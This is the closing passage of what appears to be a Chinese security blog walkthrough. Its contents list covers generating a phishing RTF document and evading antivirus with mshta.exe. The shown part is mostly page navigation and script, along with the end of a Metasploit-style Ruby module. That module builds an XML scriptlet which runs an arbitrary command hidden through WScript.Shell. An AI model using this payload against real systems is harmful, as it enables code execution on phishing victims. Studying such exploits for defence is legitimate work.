</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> command <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;&#39;</span>
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>return</span> <span style=color:#e6db74>%{&lt;?XML version=&#34;1.0&#34;?&gt;&lt;scriptlet&gt;&lt;registration progid=&#34;</span><span style=color:#e6db74>#{</span><span style=color:#66d9ef>Rex</span><span style=color:#f92672>::</span><span style=color:#66d9ef>Text</span><span style=color:#f92672>.</span>rand_text_alphanumeric <span style=color:#ae81ff>8</span><span style=color:#e6db74>}</span><span style=color:#e6db74>&#34; classid=&#34;{</span><span style=color:#e6db74>#{</span>rand_class_id<span style=color:#e6db74>}</span><span style=color:#e6db74>}&#34;&gt;&lt;/registration&gt;&lt;/scriptlet&gt;}</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># If a command is provided, tell the target system to execute it.</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>return</span> <span style=color:#e6db74>%{&lt;?XML version=&#34;1.0&#34;?&gt;&lt;scriptlet&gt;&lt;registration progid=&#34;</span><span style=color:#e6db74>#{</span><span style=color:#66d9ef>Rex</span><span style=color:#f92672>::</span><span style=color:#66d9ef>Text</span><span style=color:#f92672>.</span>rand_text_alphanumeric <span style=color:#ae81ff>8</span><span style=color:#e6db74>}</span><span style=color:#e6db74>&#34; classid=&#34;{</span><span style=color:#e6db74>#{</span>rand_class_id<span style=color:#e6db74>}</span><span style=color:#e6db74>}&#34;&gt;&lt;script&gt;&lt;![CDATA[ var r = new ActiveXObject(&#34;WScript.Shell&#34;).Run(&#34;</span><span style=color:#e6db74>#{</span>command<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;,0);]]&gt;&lt;/script&gt;&lt;/registration&gt;&lt;/scriptlet&gt;}</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>end</span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>end</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>primer</span>
</span></span><span style=display:flex><span>    generate_rtf
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>end</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>end</span>
</span></span></code></pre></td></tr></table></div></div></div><nav class="hide-on-mobile section-nav"><nav id=TableOfContents><ol><li><a href=#0x00-前言>0x00 前言</a></li><li><a href=#0x01-环境简介>0x01 环境简介</a></li><li><a href=#0x02-配置环境>0x02 配置环境</a></li><li><a href=#0x03-生成钓鱼rtf文档>0x03 生成钓鱼RTF文档</a></li><li><a href=#0x04-利用结果>0x04 利用结果</a></li><li><a href=#0x05-关于免杀---mshtaexe>0x05 关于免杀 - mshta.exe</a></li></ol></nav></nav></div><div class=post><hr class=footer-separator><div class=tags></div><div class=back><a href=https://payloads.online/><span aria-hidden=true>← Back</span></a></div><div class=back></div></div><div class=post></div></div><div class="footer wrapper"><nav class=nav><div>2024 倾旋 All rights reserved</div></nav></div><script>feather.replace()</script><script>var enableTruncate=!0,filterDepth=!1;const MAX_DEPTH=9;window.addEventListener("DOMContentLoaded",()=>{const e=new IntersectionObserver(e=>{e.reverse().forEach(e=>{const n=e.target.getAttribute("id");if(e.intersectionRatio>0){var t=document.querySelectorAll(`nav li a[href="#${n}"]`);t!=null&&t.forEach(e=>{if(e!=null){var t=getDepth(e.parentElement);filterDepth&&t<=MAX_DEPTH&&(clearActiveStatesInTableOfContents(),e.parentElement.classList.add("active"))}else filterDepth||(clearActiveStatesInTableOfContents(),e.parentElement.classList.add("active"))})}})});document.querySelectorAll("h1[id],h2[id],h3[id],h4[id]").forEach(t=>{e.observe(t)})});function isVisible(e){if(!(e instanceof Element))return!1;const n=getComputedStyle(e);if(n.display==="none")return!1;if(n.visibility!=="visible")return!1;if(n.opacity<.1)return!1;if(e.offsetWidth+e.offsetHeight+e.getBoundingClientRect().height+e.getBoundingClientRect().width===0)return!1;const t={x:e.getBoundingClientRect().left+e.offsetWidth/2,y:e.getBoundingClientRect().top+e.offsetHeight/2};if(t.x<0)return!1;if(t.x>(document.documentElement.clientWidth||window.innerWidth))return!1;if(t.y<0)return!1;if(t.y>(document.documentElement.clientHeight||window.innerHeight))return!1;let s=document.elementFromPoint(t.x,t.y);do if(s===e)return!0;while(s=s.parentNode)return!1}function clearActiveStatesInTableOfContents(){document.querySelectorAll("nav li").forEach(e=>{e.classList.remove("active")})}function getDepth(e){for(var t=0;e!==null&&e.tagName.toLowerCase()!=="ul";)t++,e=e.parentElement;return t}function navItems(){var e=document.querySelectorAll("nav nav li a");return Array.from(e).filter(e=>e.href!=null&&e.hash.startsWith("#"))}function lasItemInNavBarVisible(){var e=navItems().slice(-1)[0];return isVisible(e)}document.addEventListener("DOMContentLoaded",function(){if(!enableTruncate)return;var e=navItems();console.log(e),lasItemInNavBarVisible()||(filterDepth=!0,e.forEach(function(e){var t=getDepth(e.parentElement);t>MAX_DEPTH&&e.parentElement.classList.add("depth-nested")}))})</script></body></html>